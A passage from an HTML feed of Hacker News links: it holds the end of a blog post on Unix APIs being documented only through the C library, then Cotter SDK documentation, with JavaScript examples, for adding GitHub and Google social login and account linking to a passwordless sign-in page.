assumptions about how things work. Forcing all other languages to
fit themselves into these undocumented constraints is clearly
confining, and the standard C library generally isn't designed to
be a transparent API; in fact, at least GNU libc deliberately
manipulates what it does under the hood to be more useful to C
programs. Whether these manipulations are useful or desired for
your non-C language is an open question, but the GNU libc people
aren't necessarily going to even document them.</p>

<p>(<a href="https://marcan.st/2017/12/debugging-an-evil-go-runtime-bug/">Marcan's story</a> shows
that the standard C library behavior would have been a problem for
any language environment that attempted to use minimal stacks while
calling into 'libc', here in the form of a kernel vDSO that's
designed to be called through libc. This also shows another aspect
of the problem, in that as far as I know how much stack space you
must provide when calling the standard C library is generally not
documented. It's just assumed that you will have 'enough', whatever
that is. C code will; people who are trying to roll their own
coroutines and thread environment, maybe not.)</p>

<p>This implicit assumption has a long history in Unix. Many Unixes
have only really documented their system calls in the form of the
standard C library interface to them, quietly eliding the distinction
between the kernel API to user space and the standard C library API
to C programs. If you're lucky, you can dig up some documentation
on how to make raw system calls and what things those raw system
calls return in unusual cases like <a href="https://utcc.utoronto.ca/~cks/space/blog/unix/SocketReturnAPIDesign"><code>pipe(2)</code></a>.
I don't think very many Unixes have ever tried to explicitly and
fully document the kernel API separately from the standard C library
API, especially once you get into cases like <code>ioctl()</code> (where there
are often C macros and <code>#define</code>s that are used to form some of the
arguments, which are of course only 'documented' in the C header
files).</p>
</div></div>]]>
            </description>
            <link>https://utcc.utoronto.ca/~cks/space/blog/unix/UnixAPIAndCRuntime</link>
            <guid isPermaLink="false">hacker-news-small-sites-24596680</guid>
            <pubDate>Sat, 26 Sep 2020 05:33:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Cotter - Add Github and Google OAuth to Your Passwordless Login Page]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24596651">thread link</a>) | @mmarcelline
<br/>
September 25, 2020 | https://docs.cotter.app/sdk-reference/web/sign-in-with-social-login-provider | <a href="https://web.archive.org/web/*/https://docs.cotter.app/sdk-reference/web/sign-in-with-social-login-provider">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div data-editioncontainer="true"><div data-slate-editor="true" data-key="004b5c23c59249c3a101054b9c21c7b5" autocorrect="on" spellcheck="true" data-gramm="false"><h2 id="what-youre-building" data-key="5144fda7040b493eb24dd144175fd5db"><p><span><span data-key="232cb4eb2cd9425cac653306f1a60118"><span data-offset-key="232cb4eb2cd9425cac653306f1a60118:0">What you're building</span></span></span><a href="#what-youre-building" contenteditable="false"><span><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor"><g><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></g></svg></span></a></p></h2><p data-key="47a15faf5f8241ff8cfd930ebef68767"><span><span data-key="8d2baa78f5bc4ce5a12dd1620beadf89"><span data-offset-key="8d2baa78f5bc4ce5a12dd1620beadf89:0">Allow users to sign in with a Social Account, </span><span data-offset-key="8d2baa78f5bc4ce5a12dd1620beadf89:1"><strong data-slate-leaf="true">without getting duplicate accounts. </strong></span><span data-offset-key="8d2baa78f5bc4ce5a12dd1620beadf89:2">With Cotter, we automatically link the user's existing account with their Social Account.</span></span></span></p><div data-slate-void="true" data-key="3d5bf99f490e47a9bd0c167942a49382"><div><figure data-key="3d5bf99f490e47a9bd0c167942a49382" contenteditable="false"><div><p><img tabindex="0" src="https://gblobscdn.gitbook.com/assets%2F-M0QGDMRD8y_Kd-BpOvT%2F-MH_7vfMmIjopwJQ-ESI%2F-MH_8SXtlVChNPg3Of_Z%2Fimage.png?alt=media&amp;token=bfdbf5b3-e800-4ab6-925a-56a2f9233d80" loading="lazy"></p></div><p><figcaption><span>Sign in with Github and Google using Cotter's SDK</span></figcaption></p></figure></div></div><h2 id="key-features" data-key="5f9cfc61294245abb665b030d4f05c91"><p><span><span data-key="9170f4bd19164649b6e2971e01c33e35"><span data-offset-key="9170f4bd19164649b6e2971e01c33e35:0">Key Features</span></span></span><a href="#key-features" contenteditable="false"><span><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor"><g><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></g></svg></span></a></p></h2><ul data-key="d9a6277fb1c445d1ba91d55c8ec01b14"><li><p data-key="070bd036db7e429bbcda0bf865920524"><span><span data-key="dabde922c15941759dc43da7e939b8dc"><span data-offset-key="dabde922c15941759dc43da7e939b8dc:0">Simple integration, </span><span data-offset-key="dabde922c15941759dc43da7e939b8dc:1"><strong data-slate-leaf="true">no additional code</strong></span><span data-offset-key="dabde922c15941759dc43da7e939b8dc:2">.</span></span></span></p></li><li><p data-key="a8e0e5f5b0d64f17ac8de42efa3298b4"><span><span data-key="bc150d92e3e5464397eedd5a8dcf4892"><span data-offset-key="bc150d92e3e5464397eedd5a8dcf4892:0"><strong data-slate-leaf="true">Auto-linking with existing accounts</strong></span><span data-offset-key="bc150d92e3e5464397eedd5a8dcf4892:1">, users can either log in with their email or with Github and it will go to the same user account.</span></span></span></p></li><li><p data-key="15d7db35a9574ccea1700618bdfc1617"><span><span data-key="818def895f714ed38e9672616f3aa27f"><span data-offset-key="818def895f714ed38e9672616f3aa27f:0">Connect Social Provider Account from inside your Settings page to allow easy API integrations. (For example, a user never uses the "Sign in with Github", but you need their Github access token to enable deployment: you can ask them to press a button to connect their Github account).</span></span></span></p></li></ul><h2 id="overview" data-key="97640c8eb22641a78f82e065495f9033"><p><span><span data-key="67b2157a1c36482e87a950a6382455e8"><span data-offset-key="67b2157a1c36482e87a950a6382455e8:0">Overview</span></span></span><a href="#overview" contenteditable="false"><span><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor"><g><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></g></svg></span></a></p></h2><p data-key="72ce0c7cdb7f4b98999e260e5be575ba"><span><span data-key="786c325c2094423fab998a30851e84f6"><span data-offset-key="786c325c2094423fab998a30851e84f6:0">To enable this feature, you need to first configure </span></span><a data-key="33af1192623240e6bd899dd22a2cb3ed" href="https://docs.cotter.app/sdk-reference/web/web-sdk-verify-email-phone"><span data-key="5174f54005b8426583a56c833eee6875"><span data-offset-key="5174f54005b8426583a56c833eee6875:0">Sign in with Email/Phone Number</span></span></a><span data-key="a68f265fdc2e4b2383a585d1c09c8618"><span data-offset-key="a68f265fdc2e4b2383a585d1c09c8618:0"> as the primary login method.</span></span></span></p><p data-key="0d2a76dd426a4b0c8016b945e736f095"><span><span data-key="b153efe9acd045778241e08923d0c308"><span data-offset-key="b153efe9acd045778241e08923d0c308:0">You can then add options for the user to sign in using a Social Login Provider.</span></span></span></p><h3 id="available-providers" data-key="ab3125600c5d4f68a1cf8d910b22918e"><p><span><span data-key="ade059b3a3124128a9749bf599c34ae4"><span data-offset-key="ade059b3a3124128a9749bf599c34ae4:0">Available Providers</span></span></span><a href="#available-providers" contenteditable="false"><span><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor"><g><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></g></svg></span></a></p></h3><ul data-key="e10db9755ae34d5185a11fa23d9e6a4a"><li><p data-key="549391418fcb41c7896fb10d69103902"><span><span data-key="eecd2fcd25dd4f6c95c7b62a05dc2fa0"><span data-offset-key="eecd2fcd25dd4f6c95c7b62a05dc2fa0:0">Github</span></span></span></p></li><li><p data-key="8f9fd2af3fa94eba8db5a0897c3f2359"><span><span data-key="c8e6a8e728914ac083ef40fc62022344"><span data-offset-key="c8e6a8e728914ac083ef40fc62022344:0">Google</span></span></span></p></li><li></li></ul><div data-key="9528438fd83f4794bcd7cfad7a8c15c0"><p data-key="b39e3f44d19643b1b2c30a7ba63b4142"><span><span data-key="85421a031f324290a43c5bef41126f16"><span data-offset-key="85421a031f324290a43c5bef41126f16:0">Make sure you are using the JS Package </span><span data-offset-key="85421a031f324290a43c5bef41126f16:1"><strong data-slate-leaf="true">version &gt;= 0.3.16</strong></span></span></span></p></div><ol data-key="052ddb2a82c14747b5e4654074866dbd"><li><div data-key="06db45757e554741926acb05bbae8a9f"><p data-key="e868f65bac93401caf71724db9f3e6fd"><span><span data-key="b24cb7c032ac4c099abcdcca0b611240"><span data-offset-key="b24cb7c032ac4c099abcdcca0b611240:0">You will need to create an "App" for the Social Login Provider. Follow the instructions for each login provider. You will need to enter the credentials to </span></span><a href="https://dev.cotter.app/" target="_blank" rel="noopener noreferrer" data-key="9cea6e80dd584805919d2c0c7eec749d"><span data-key="4cf47a325592489da32cff219b9f9e7f"><span data-offset-key="4cf47a325592489da32cff219b9f9e7f:0">Dashboard</span></span></a><span data-key="06f237ebc56d497b8ce596af189fe643"><span data-offset-key="06f237ebc56d497b8ce596af189fe643:0"> &gt; Social Login</span></span></span></p><ul data-key="3e721e923efa45caa8a56083a307f140"><li></li></ul></div></li><li><p data-key="ba52c415e87f40d08a1054e513f76da3"><span><span data-key="d1de950b5dfd43d087eb4849090a794c"><span data-offset-key="d1de950b5dfd43d087eb4849090a794c:0">Go to </span></span><a href="https://dev.cotter.app/" target="_blank" rel="noopener noreferrer" data-key="48d4f4007bf94600ba37d7b58dba9825"><span data-key="6b247e3bf64a4646b2777cd6a6c3f611"><span data-offset-key="6b247e3bf64a4646b2777cd6a6c3f611:0">Dashboard</span></span></a><span data-key="f5dbb9101f584e1d97b34509f61d6041"><span data-offset-key="f5dbb9101f584e1d97b34509f61d6041:0"> &gt; Branding, check the login provider that you want to enable under "Social Login Providers" and press </span><span data-offset-key="f5dbb9101f584e1d97b34509f61d6041:1"><strong data-slate-leaf="true">Save</strong></span><span data-offset-key="f5dbb9101f584e1d97b34509f61d6041:2">.</span></span></span></p></li></ol><div data-slate-void="true" data-key="03900755109f4ac5975a5790f69dbbbc"><div><figure data-key="03900755109f4ac5975a5790f69dbbbc" contenteditable="false"><div><p><img tabindex="0" src="https://gblobscdn.gitbook.com/assets%2F-M0QGDMRD8y_Kd-BpOvT%2F-MGMMASd6kzR8JDkDiP3%2F-MGMPE1WbNv4xjWEAYJq%2Fimage.png?alt=media&amp;token=1a063573-c8d7-4a76-b382-dc0fa6f88a6b" loading="lazy"></p></div></figure></div></div><p data-key="5423da2ea85649b1b23bc1e5ca57de21"><span><span data-key="b45dcc60e4cc4c3299c3f056d97429c6"><span data-offset-key="b45dcc60e4cc4c3299c3f056d97429c6:0">4. That's it, you should now see the "Sign in with Github" button below the email/phone number input. </span></span></span></p><h2 id="receiving-the-user-response-after-successful-login" data-key="8eeefde07da442d986c8c9c540afe695"><p><span><span data-key="0f7b02ff6adf4b5f940be4a33d3c8f2e"><span data-offset-key="0f7b02ff6adf4b5f940be4a33d3c8f2e:0">Receiving the User Response after successful login</span></span></span><a href="#receiving-the-user-response-after-successful-login" contenteditable="false"><span><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor"><g><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></g></svg></span></a></p></h2><p data-key="1e0325bf56b2472fa40180053eb72d53"><span><span data-key="337fbe8d38ef4537871a50ca7b3e8be6"><span data-offset-key="337fbe8d38ef4537871a50ca7b3e8be6:0">You will receive responses the same way as </span></span><a data-key="b236ac0f850a4550bca9483405d6dc36" href="https://docs.cotter.app/sdk-reference/web/web-sdk-verify-email-phone"><span data-key="26744804421f4969bbf7e571fd446b93"><span data-offset-key="26744804421f4969bbf7e571fd446b93:0"><strong data-slate-leaf="true">Sign in with email/phone</strong></span></span></a><span data-key="4c833856a4224508b3e7c90839192296"><span data-offset-key="4c833856a4224508b3e7c90839192296:0">, inside the </span><span data-offset-key="4c833856a4224508b3e7c90839192296:1"><code spellcheck="false" data-slate-leaf="true">then</code></span><span data-offset-key="4c833856a4224508b3e7c90839192296:2"> callback that you provided.</span></span></span></p><div><pre data-key="da2dc19d90564bfa8f09d23e50f0a24d" spellcheck="false"><p><span data-key="f56ab637e666476294dce63e00303104"><span data-offset-key="f56ab637e666476294dce63e00303104:0"><span>var</span></span><span data-offset-key="f56ab637e666476294dce63e00303104:1"><span> cotter </span></span><span data-offset-key="f56ab637e666476294dce63e00303104:2"><span>=</span></span><span data-offset-key="f56ab637e666476294dce63e00303104:3"><span> </span></span><span data-offset-key="f56ab637e666476294dce63e00303104:4"><span>new</span></span><span data-offset-key="f56ab637e666476294dce63e00303104:5"><span> </span></span><span data-offset-key="f56ab637e666476294dce63e00303104:6"><span>Cotter</span></span><span data-offset-key="f56ab637e666476294dce63e00303104:7"><span>(</span></span><span data-offset-key="f56ab637e666476294dce63e00303104:8"><span>API_KEY_ID</span></span><span data-offset-key="f56ab637e666476294dce63e00303104:9"><span>)</span></span><span data-offset-key="f56ab637e666476294dce63e00303104:10"><span>;</span></span><span data-offset-key="f56ab637e666476294dce63e00303104:11"><span> </span></span><span data-offset-key="f56ab637e666476294dce63e00303104:12"></span></span></p><p><span data-key="da2b9a3849fc4ccdae5321543426cad5"><span data-offset-key="da2b9a3849fc4ccdae5321543426cad5:0"><span>cotter</span></span></span></p><p><span data-key="d39a042c8d0f49599bfa0f3b4e424014"><span data-offset-key="d39a042c8d0f49599bfa0f3b4e424014:0"><span>  </span></span><span data-offset-key="d39a042c8d0f49599bfa0f3b4e424014:1"><span>.</span></span><span data-offset-key="d39a042c8d0f49599bfa0f3b4e424014:2"><span>signInWithLink</span></span><span data-offset-key="d39a042c8d0f49599bfa0f3b4e424014:3"><span>(</span></span><span data-offset-key="d39a042c8d0f49599bfa0f3b4e424014:4"><span>)</span></span></span></p><p><span data-key="6c7a297b439448ad9eda63b2f384da19"><span data-offset-key="6c7a297b439448ad9eda63b2f384da19:0"><span>  </span></span><span data-offset-key="6c7a297b439448ad9eda63b2f384da19:1"><span>.</span></span><span data-offset-key="6c7a297b439448ad9eda63b2f384da19:2"><span>showEmailForm</span></span><span data-offset-key="6c7a297b439448ad9eda63b2f384da19:3"><span>(</span></span><span data-offset-key="6c7a297b439448ad9eda63b2f384da19:4"><span>)</span></span></span></p><p><span data-key="e8e866071d574d65bbe3be42079684cc"><span data-offset-key="e8e866071d574d65bbe3be42079684cc:0"><span>  </span></span><span data-offset-key="e8e866071d574d65bbe3be42079684cc:1"><span>.</span></span><span data-offset-key="e8e866071d574d65bbe3be42079684cc:2"><span>then</span></span><span data-offset-key="e8e866071d574d65bbe3be42079684cc:3"><span>(</span></span><span data-offset-key="e8e866071d574d65bbe3be42079684cc:4"><span>(</span></span><span data-offset-key="e8e866071d574d65bbe3be42079684cc:5"><span>response</span></span><span data-offset-key="e8e866071d574d65bbe3be42079684cc:6"><span>)</span></span><span data-offset-key="e8e866071d574d65bbe3be42079684cc:7"><span> </span></span><span data-offset-key="e8e866071d574d65bbe3be42079684cc:8"><span>=&gt;</span></span><span data-offset-key="e8e866071d574d65bbe3be42079684cc:9"><span> </span></span><span data-offset-key="e8e866071d574d65bbe3be42079684cc:10"><span>{</span></span></span></p><p><span data-key="787b1342e488402fa476930d6092cdcb"><span data-offset-key="787b1342e488402fa476930d6092cdcb:0"><span>    </span></span><span data-offset-key="787b1342e488402fa476930d6092cdcb:1"><span>setpayload</span></span><span data-offset-key="787b1342e488402fa476930d6092cdcb:2"><span>(</span></span><span data-offset-key="787b1342e488402fa476930d6092cdcb:3"><span>response</span></span><span data-offset-key="787b1342e488402fa476930d6092cdcb:4"><span>)</span></span><span data-offset-key="787b1342e488402fa476930d6092cdcb:5"><span>;</span></span><span data-offset-key="787b1342e488402fa476930d6092cdcb:6"><span> </span></span><span data-offset-key="787b1342e488402fa476930d6092cdcb:7"></span></span></p><p><span data-key="4f541d5f70f44f4d8d2450a13e1f7b9d"><span data-offset-key="4f541d5f70f44f4d8d2450a13e1f7b9d:0"><span>  </span></span><span data-offset-key="4f541d5f70f44f4d8d2450a13e1f7b9d:1"><span>}</span></span><span data-offset-key="4f541d5f70f44f4d8d2450a13e1f7b9d:2"><span>)</span></span></span></p><p><span data-key="ba2ddf2a0368420c822719b07b457092"><span data-offset-key="ba2ddf2a0368420c822719b07b457092:0"><span>  </span></span><span data-offset-key="ba2ddf2a0368420c822719b07b457092:1"><span>.</span></span><span data-offset-key="ba2ddf2a0368420c822719b07b457092:2"><span>catch</span></span><span data-offset-key="ba2ddf2a0368420c822719b07b457092:3"><span>(</span></span><span data-offset-key="ba2ddf2a0368420c822719b07b457092:4"><span>(</span></span><span data-offset-key="ba2ddf2a0368420c822719b07b457092:5"><span>err</span></span><span data-offset-key="ba2ddf2a0368420c822719b07b457092:6"><span>)</span></span><span data-offset-key="ba2ddf2a0368420c822719b07b457092:7"><span> </span></span><span data-offset-key="ba2ddf2a0368420c822719b07b457092:8"><span>=&gt;</span></span><span data-offset-key="ba2ddf2a0368420c822719b07b457092:9"><span> console</span></span><span data-offset-key="ba2ddf2a0368420c822719b07b457092:10"><span>.</span></span><span data-offset-key="ba2ddf2a0368420c822719b07b457092:11"><span>log</span></span><span data-offset-key="ba2ddf2a0368420c822719b07b457092:12"><span>(</span></span><span data-offset-key="ba2ddf2a0368420c822719b07b457092:13"><span>err</span></span><span data-offset-key="ba2ddf2a0368420c822719b07b457092:14"><span>)</span></span><span data-offset-key="ba2ddf2a0368420c822719b07b457092:15"><span>)</span></span><span data-offset-key="ba2ddf2a0368420c822719b07b457092:16"><span>;</span></span></span></p></pre></div><p data-key="0f1f58ece46640f59bd53ce5a39bebb7"><span><span data-key="94d3d703c276434aba896ce85d8b802c"><span data-offset-key="94d3d703c276434aba896ce85d8b802c:0">If a user with signed-in with Github and the Github username is user1 and the Github email is </span></span><a href="mailto:user1@gmail.com" rel="noopener noreferrer" data-key="bc5b5019f14646b5a7f36a4c431ac0f7"><span data-key="3a4208fc3e504251877de6795c47672e"><span data-offset-key="3a4208fc3e504251877de6795c47672e:0">user1@gmail.com</span></span></a><span data-key="affb3cb1c1e3407d8ebfff66f2938925"><span data-offset-key="affb3cb1c1e3407d8ebfff66f2938925:0">:</span></span></span></p><ul data-key="24a2c5ee4f854ff6af5da05a7a8d43a3"><li><p data-key="829d051a66e74405a6ed312cfcd13862"><span><span data-key="336f848c56234efbbda98cc7967846f6"><span data-offset-key="336f848c56234efbbda98cc7967846f6:0"><strong data-slate-leaf="true">Case 1 ‚Äì If a user with Github username </strong></span><span data-offset-key="336f848c56234efbbda98cc7967846f6:1"><strong data-slate-leaf="true"><code spellcheck="false" data-slate-leaf="true">user1</code></strong></span><span data-offset-key="336f848c56234efbbda98cc7967846f6:2"><strong data-slate-leaf="true"> has logged-in before</strong></span><span data-offset-key="336f848c56234efbbda98cc7967846f6:3"> and already associated with a user (</span><span data-offset-key="336f848c56234efbbda98cc7967846f6:4"><code spellcheck="false" data-slate-leaf="true">userID: 123</code></span><span data-offset-key="336f848c56234efbbda98cc7967846f6:5">), then</span><span data-offset-key="336f848c56234efbbda98cc7967846f6:6"><strong data-slate-leaf="true"> </strong></span><span data-offset-key="336f848c56234efbbda98cc7967846f6:7">the user can automatically log in.</span></span></span></p></li><li><p data-key="0a3c209ca96349abb3ee43bc24a7717e"><span><span data-key="1de0f0528ad643d592f78af434b84ef4"><span data-offset-key="1de0f0528ad643d592f78af434b84ef4:0"><strong data-slate-leaf="true">Case 2 ‚Äì If a user with email </strong></span></span><a href="mailto:user1@gmail.com" rel="noopener noreferrer" data-key="e1a0003c5e1b42bc8781000e0c2c49e3"><span data-key="613965e145e246b395b8402019ad53d6"><span data-offset-key="613965e145e246b395b8402019ad53d6:0"><strong data-slate-leaf="true">user1@gmail.com</strong></span></span></a><span data-key="0a191c0bea3e4230b4bfa322e849c069"><span data-offset-key="0a191c0bea3e4230b4bfa322e849c069:0"><strong data-slate-leaf="true"> doesn't exist</strong></span><span data-offset-key="0a191c0bea3e4230b4bfa322e849c069:1">: It will create a new user with email </span></span><a href="mailto:user1@gmail.com" rel="noopener noreferrer" data-key="b77f5885535a4dc490153a9b18ec750f"><span data-key="4f194812951b416aa85517eba448b0a5"><span data-offset-key="4f194812951b416aa85517eba448b0a5:0">user1@gmail.com</span></span></a><span data-key="bfadf0cae28f48d3ad3e9cc8374493df"><span data-offset-key="bfadf0cae28f48d3ad3e9cc8374493df:0">, and the user can log in both with their Github account or with email </span></span><a href="mailto:user1@gmail.com" rel="noopener noreferrer" data-key="2a55810526144ecdb72aa170fa663416"><span data-key="22d8f91106a249d3aea02c60b99bb1b4"><span data-offset-key="22d8f91106a249d3aea02c60b99bb1b4:0">user1@gmail.com</span></span></a><span data-key="cf37f4f367de4d46bbd09cc943266590"><span data-offset-key="cf37f4f367de4d46bbd09cc943266590:0"> using a magic link or OTP.</span></span></span></p></li><li><p data-key="ff6d20c98f724343b7441fef8fe87af1"><span><span data-key="6d4be04c203747d69bbe755e0f62df21"><span data-offset-key="6d4be04c203747d69bbe755e0f62df21:0"><strong data-slate-leaf="true">Case 3 ‚Äì If a user with email </strong></span></span><a href="mailto:user1@gmail.com" rel="noopener noreferrer" data-key="3a61d5fa73644af48d3eaccc1b33f971"><span data-key="3d136b820aa04e12883ba76d68228458"><span data-offset-key="3d136b820aa04e12883ba76d68228458:0"><strong data-slate-leaf="true">user1@gmail.com</strong></span></span></a><span data-key="ecf1a5e9ffc1406f8500df5154d49d9e"><span data-offset-key="ecf1a5e9ffc1406f8500df5154d49d9e:0"><strong data-slate-leaf="true"> already exists</strong></span><span data-offset-key="ecf1a5e9ffc1406f8500df5154d49d9e:1">: It will ask the user if they want to link the account for </span></span><a href="mailto:user1@gmail.com" rel="noopener noreferrer" data-key="b4ede38e0db749f4a160dc2eff77274a"><span data-key="8b4a92ae41f34004a844750ee46a6ed0"><span data-offset-key="8b4a92ae41f34004a844750ee46a6ed0:0">user1@gmail.com</span></span></a><span data-key="9c75ec3b694d4e4d8655dab687488b1f"><span data-offset-key="9c75ec3b694d4e4d8655dab687488b1f:0"> with the Github account. If they agree, the user can always login both with their Github account or with email </span></span><a href="mailto:user1@gmail.com" rel="noopener noreferrer" data-key="0264bdc26cc34ae8b631670c05fa026c"><span data-key="874c9040c02f4768926a6cb2391d1ae2"><span data-offset-key="874c9040c02f4768926a6cb2391d1ae2:0">user1@gmail.com</span></span></a><span data-key="a058d73686fb46d2ad43f68e4540861c"><span data-offset-key="a058d73686fb46d2ad43f68e4540861c:0"> using a magic link or OTP.</span></span></span></p></li></ul><div data-slate-void="true" data-key="90c802a671824b279b1cf252ca2ba9aa"><div><figure data-key="90c802a671824b279b1cf252ca2ba9aa" contenteditable="false"><div><p><img tabindex="0" src="https://gblobscdn.gitbook.com/assets%2F-M0QGDMRD8y_Kd-BpOvT%2F-MGMROdZrPKL7WqtmWW0%2F-MGMSCjt9Zb2Ur1eQwLM%2Fimage.png?alt=media&amp;token=0194de27-f018-40ac-9ce8-664aee4aea97" loading="lazy"></p></div><p><figcaption><span>Case 3: Prompt for the user to connect their existing account with the Github account</span></figcaption></p></figure></div></div><p data-key="6a53ad8f97bb4fc78207be8d47793c31"><span><span data-key="a58e8d5ce60445dfb9dc5a940b7cd169"><span data-offset-key="a58e8d5ce60445dfb9dc5a940b7cd169:0">You can alternatively </span><span data-offset-key="a58e8d5ce60445dfb9dc5a940b7cd169:1"><strong data-slate-leaf="true">connect the user's Github/Google account when the user is already logged</strong></span><span data-offset-key="a58e8d5ce60445dfb9dc5a940b7cd169:2"> </span><span data-offset-key="a58e8d5ce60445dfb9dc5a940b7cd169:3"><strong data-slate-leaf="true">in.</strong></span><span data-offset-key="a58e8d5ce60445dfb9dc5a940b7cd169:4"> For example, your website may have a Settings page, and the user can press a button "Connect Github Login" to allow them to connect their Github Account and use it to log in.</span></span></span></p><p data-key="f60abb2d367c4a73ae544a26955f1df5"><span><span data-key="45fdc82880054b358ec92538c3a76048"><span data-offset-key="45fdc82880054b358ec92538c3a76048:0">Add a button on your website, and call this function to connect the user's Github Account with the currently logged in user.</span></span></span></p><div><pre data-key="b814bc2901b842458e76097503b104ce" spellcheck="false"><p><span data-key="443f7b1f89b748a787c72e0a28d21844"><span data-offset-key="443f7b1f89b748a787c72e0a28d21844:0"><span>const</span></span><span data-offset-key="443f7b1f89b748a787c72e0a28d21844:1"><span> connectToGithub </span></span><span data-offset-key="443f7b1f89b748a787c72e0a28d21844:2"><span>=</span></span><span data-offset-key="443f7b1f89b748a787c72e0a28d21844:3"><span> </span></span><span data-offset-key="443f7b1f89b748a787c72e0a28d21844:4"><span>async</span></span><span data-offset-key="443f7b1f89b748a787c72e0a28d21844:5"><span> </span></span><span data-offset-key="443f7b1f89b748a787c72e0a28d21844:6"><span>(</span></span><span data-offset-key="443f7b1f89b748a787c72e0a28d21844:7"><span>)</span></span><span data-offset-key="443f7b1f89b748a787c72e0a28d21844:8"><span> </span></span><span data-offset-key="443f7b1f89b748a787c72e0a28d21844:9"><span>=&gt;</span></span><span data-offset-key="443f7b1f89b748a787c72e0a28d21844:10"><span> </span></span><span data-offset-key="443f7b1f89b748a787c72e0a28d21844:11"><span>{</span></span></span></p><p><span data-key="3a545e82585443ca90cbc70b02cd8a4b"><span data-offset-key="3a545e82585443ca90cbc70b02cd8a4b:0"><span>  </span></span><span data-offset-key="3a545e82585443ca90cbc70b02cd8a4b:1"><span>var</span></span><span data-offset-key="3a545e82585443ca90cbc70b02cd8a4b:2"><span> cotter </span></span><span data-offset-key="3a545e82585443ca90cbc70b02cd8a4b:3"><span>=</span></span><span data-offset-key="3a545e82585443ca90cbc70b02cd8a4b:4"><span> </span></span><span data-offset-key="3a545e82585443ca90cbc70b02cd8a4b:5"><span>new</span></span><span data-offset-key="3a545e82585443ca90cbc70b02cd8a4b:6"><span> </span></span><span data-offset-key="3a545e82585443ca90cbc70b02cd8a4b:7"><span>Cotter</span></span><span data-offset-key="3a545e82585443ca90cbc70b02cd8a4b:8"><span>(</span></span><span data-offset-key="3a545e82585443ca90cbc70b02cd8a4b:9"><span>apiKey</span></span><span data-offset-key="3a545e82585443ca90cbc70b02cd8a4b:10"><span>)</span></span></span></p><p><span data-key="9a1dfd9b96154af1aa26d36865af9bac"><span data-offset-key="9a1dfd9b96154af1aa26d36865af9bac:0"><span>  </span></span><span data-offset-key="9a1dfd9b96154af1aa26d36865af9bac:1"><span>const</span></span><span data-offset-key="9a1dfd9b96154af1aa26d36865af9bac:2"><span> accessToken </span></span><span data-offset-key="9a1dfd9b96154af1aa26d36865af9bac:3"><span>=</span></span><span data-offset-key="9a1dfd9b96154af1aa26d36865af9bac:4"><span> </span></span><span data-offset-key="9a1dfd9b96154af1aa26d36865af9bac:5"><span>await</span></span><span data-offset-key="9a1dfd9b96154af1aa26d36865af9bac:6"><span> cotter</span></span><span data-offset-key="9a1dfd9b96154af1aa26d36865af9bac:7"><span>.</span></span><span data-offset-key="9a1dfd9b96154af1aa26d36865af9bac:8"><span>tokenHandler</span></span><span data-offset-key="9a1dfd9b96154af1aa26d36865af9bac:9"><span>.</span></span><span data-offset-key="9a1dfd9b96154af1aa26d36865af9bac:10"><span>getAccessToken</span></span><span data-offset-key="9a1dfd9b96154af1aa26d36865af9bac:11"><span>(</span></span><span data-offset-key="9a1dfd9b96154af1aa26d36865af9bac:12"><span>)</span></span></span></p><p><span data-key="00bfdb4e7e9b4863b85a60ef48dccff0"><span data-offset-key="00bfdb4e7e9b4863b85a60ef48dccff0:0"><span>  cotter</span></span><span data-offset-key="00bfdb4e7e9b4863b85a60ef48dccff0:1"><span>.</span></span><span data-offset-key="00bfdb4e7e9b4863b85a60ef48dccff0:2"><span>connectSocialLogin</span></span><span data-offset-key="00bfdb4e7e9b4863b85a60ef48dccff0:3"><span>(</span></span><span data-offset-key="00bfdb4e7e9b4863b85a60ef48dccff0:4"><span>"GITHUB"</span></span><span data-offset-key="00bfdb4e7e9b4863b85a60ef48dccff0:5"><span>,</span></span><span data-offset-key="00bfdb4e7e9b4863b85a60ef48dccff0:6"><span> accessToken</span></span><span data-offset-key="00bfdb4e7e9b4863b85a60ef48dccff0:7"><span>?</span></span><span data-offset-key="00bfdb4e7e9b4863b85a60ef48dccff0:8"><span>.</span></span><span data-offset-key="00bfdb4e7e9b4863b85a60ef48dccff0:9"><span>token</span></span><span data-offset-key="00bfdb4e7e9b4863b85a60ef48dccff0:10"><span>)</span></span><span 